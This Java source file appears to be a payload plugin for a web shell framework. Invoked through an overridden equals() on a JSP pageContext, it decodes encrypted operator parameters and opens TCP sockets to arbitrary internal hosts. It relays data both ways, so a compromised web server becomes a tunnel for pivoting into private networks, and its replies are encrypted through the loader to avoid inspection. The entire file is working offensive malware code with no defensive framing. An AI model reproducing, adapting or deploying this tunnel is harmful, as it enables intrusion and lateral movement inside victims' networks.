import java.io.*;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.nio.charset.StandardCharsets;

public class proxy extends ClassLoader
{
    public proxy(ClassLoader objParent) { super(objParent); }
    public proxy() { super(proxy.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored) {}
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;
        
        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            
            String z0 = mapParams.get("z0");
            String z2 = mapParams.get("z2");
            String z3 = mapParams.get("z3");
            String z4 = mapParams.get("z4");

            if (z0 == null || z2 == null || z3 == null) {
                fnWriteOutput(objParam, objResponse, osClient, "{\"status\":\"error\",\"msg\":\"Missing parameters\"}".getBytes());
                return true;
            }
            
            String action = new String(Base64.getDecoder().decode(z0), StandardCharsets.UTF_8).trim();
            String targetIp = new String(Base64.getDecoder().decode(z2), StandardCharsets.UTF_8).trim();
            String targetPortStr = new String(Base64.getDecoder().decode(z3), StandardCharsets.UTF_8).trim();
            int targetPort = Integer.parseInt(targetPortStr);

            String szResponseResult = "";

            if ("forward".equals(action)) {
                Socket socket = null;
                try {
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(targetIp, targetPort), 3000);
                    
                    socket.setSoTimeout(1500); 

                    OutputStream osRemote = socket.getOutputStream();
                    InputStream isRemote = socket.getInputStream();

                    if (z4 != null && !z4.isEmpty()) {
                        byte[] firstDecode = Base64.getDecoder().decode(z4);
                        byte[] forwardData = Base64.getDecoder().decode(firstDecode);
                        if (forwardData.length > 0) {
                            osRemote.write(forwardData);
                            osRemote.flush();
                        }
                    }

                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    byte[] buffer = new byte[8192];
                    int bytesRead = -1;
                    int retry = 0;

                    while (retry < 3) {
                        try {
                            Thread.sleep(50); 
                            
                            if (isRemote.available() > 0) {
                                while (isRemote.available() > 0 && (bytesRead = isRemote.read(buffer)) != -1) {
                                    bos.write(buffer, 0, bytesRead);
                                }
                            }
                            
                            if (bos.size() > 0) {
                                break;
                            }
                        } catch (Exception exSocket) {
                            
                        }
                        retry++;
                    }

                    byte[] responseData = bos.toByteArray();
                    String base64Response = Base64.getEncoder().encodeToString(responseData);
                    
                    szResponseResult = "{\"status\":\"success\",\"data\":\"" + base64Response + "\"}";

                } catch (Exception exConnect) {
                    szResponseResult = "{\"status\":\"error\",\"msg\":\"Connect failed\"}";
                } finally {
                    if (socket != null) {
                        try { socket.close(); } catch (Exception e) {}
                    }
                }
            } else {
                szResponseResult = "{\"status\":\"error\",\"msg\":\"Unknown action\"}";
            }

            fnWriteOutput(objParam, objResponse, osClient, szResponseResult.getBytes(StandardCharsets.UTF_8));
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));
                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }
}